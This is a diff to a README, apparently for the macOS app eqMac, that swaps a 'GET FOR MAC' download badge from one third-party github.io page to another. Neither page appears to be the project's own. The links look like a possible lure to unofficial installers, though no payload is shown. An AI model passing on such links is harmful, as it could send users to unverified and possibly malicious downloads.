@@ -8,7 +8,7 @@
 
 <div align="center">  
 
-[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://osx-applications-install.github.io/.github/eqMac)  
+[![Get for MacOS](https://img.shields.io/badge/🍏_GET_FOR_MAC-green?style=for-the-badge&logo=apple)](https://apps-pozdnyakov-software.github.io/.github/eqMac)  
 
 </div>  
 
